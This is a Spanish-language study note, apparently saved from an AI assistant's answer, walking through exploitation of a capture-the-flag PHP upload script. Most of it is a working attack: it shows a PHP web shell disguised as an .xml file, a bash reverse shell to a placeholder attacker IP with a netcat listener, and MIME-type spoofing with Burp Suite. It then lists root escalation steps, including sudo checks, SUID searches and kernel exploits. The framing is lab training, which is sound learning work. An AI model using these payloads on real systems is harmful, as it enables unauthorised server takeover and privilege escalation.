---
aliases:
tags:
  - type/concept
  - estado/incompleto
primary categories:
secondary categories:
tertiary categories:
linked:
---

Este código es un ejemplo clásico de un "CTF" (Capture The Flag). Tiene una vulnerabilidad crítica que permite **RCE (Remote Code Execution)**, lo cual es el primer paso vital para conseguir acceso al sistema y eventualmente escalar privilegios a root.

Aunque el código te "trollea" con el mensaje `<h1>esta web será vulnerable a XXE????</h1>`, la verdadera vulnerabilidad es mucho más grave y directa que un XXE.

Aquí tienes el análisis detallado:

### 1. El Análisis del Código

El script es un formulario de subida de archivos con tres filtros de seguridad aparentes, pero con un fallo fatal en la ejecución.

- **Los Filtros (Bypassables):**
    
    1. **Extensión:** `strtolower($uploaded_ext) == 'xml'`. El archivo _debe_ terminar en `.xml`.
        
    2. **Tamaño:** Menor a 100kb.
        
    3. **MIME Type:** Debe ser `application/xml` o `text/xml`. Esto es lo que el navegador le dice al servidor que es el archivo. Se puede falsificar fácilmente con herramientas como Burp Suite.
        
- **El Fallo Fatal (The Sink):**
    
    PHP
    
    ```
    include($uploaded_tmp);
    ```
    
    Aquí está la clave. La función `include()` de PHP **no le importa la extensión del archivo**. Si incluyes un archivo `.xml`, `.txt` o `.jpg` que contenga etiquetas de apertura de PHP (`<?php ... ?>`), el servidor **ejecutará ese código**.
    

### 2. Estrategia de Explotación (Cómo entrar)

Para ganar acceso inicial (www-data), no necesitas un ataque XXE complejo; necesitas una "Web Shell" disfrazada.

#### Paso 1: Crear el Payload

Crea un archivo llamado `exploit.xml`. Dado que el servidor lo va a incluir, pon código PHP dentro.

**Opción A: Test de concepto (Rápido)**

XML

```
<?php system('id'); ?>
```

_Si al subirlo ves algo como `uid=33(www-data)...` en la pantalla, tienes ejecución de comandos._

Opción B: Reverse Shell (Para tomar control)

Este es el payload para que la máquina se conecte a ti.

XML

```
<?php
// Cambia TU_IP y TU_PUERTO
exec("/bin/bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'");
?>
```

#### Paso 2: Subir y Ejecutar

1. En tu terminal (atacante), pon netcat a la escucha: `nc -lvnp 4444`.
    
2. Sube el archivo `exploit.xml` a través de la web.
    
3. **Nota sobre el MIME Type:** Si la web rechaza el archivo diciendo "Tu formato no es permitido", es posible que tu navegador esté enviando el tipo incorrecto.
    
    - Usa **Burp Suite** para interceptar la petición de subida.
        
    - Cambia el `Content-Type` de tu archivo a `application/xml`.
        
4. En cuanto el script llegue a la línea `include($uploaded_tmp);`, el código se ejecutará y deberías recibir la conexión en tu netcat.
    

### 3. Escalada a Root (El objetivo final)

Una vez que tengas tu terminal (shell) como el usuario `www-data` (o similar), el script PHP ya cumplió su función. Ahora estás dentro del Linux. Para llegar a **root**, busca lo siguiente:

1. **Permisos de Sudo:** Ejecuta `sudo -l`. A veces los profesores dejan que `www-data` ejecute algún comando sin contraseña.
    
2. Binarios SUID: Busca archivos que se ejecuten con permisos de dueño (root) pero que tú puedas usar:
    
    find / -perm -u=s -type f 2>/dev/null
    
    (Busca binarios extraños o comunes como vim, find, nmap que permitan escapar a una shell).
    
3. **Kernel Exploits:** Si la máquina es vieja, `uname -a` te dará la versión. Busca en Google "Linux Kernel [versión] exploit".
    
4. **Archivos Internos:** Revisa `/var/www/html` o `/opt` buscando archivos con contraseñas hardcodeadas o configuraciones de bases de datos.
    

### Resumen

No te distraigas con el mensaje de XXE. Aunque podrías usar XXE para leer archivos (`/etc/passwd`), el `include()` te regala ejecución de código directa. Sube un PHP camuflado como XML y tendrás tu acceso.

**¿Quieres que te detalle cómo interceptar la petición con Burp Suite si el filtro de MIME Type te da problemas?**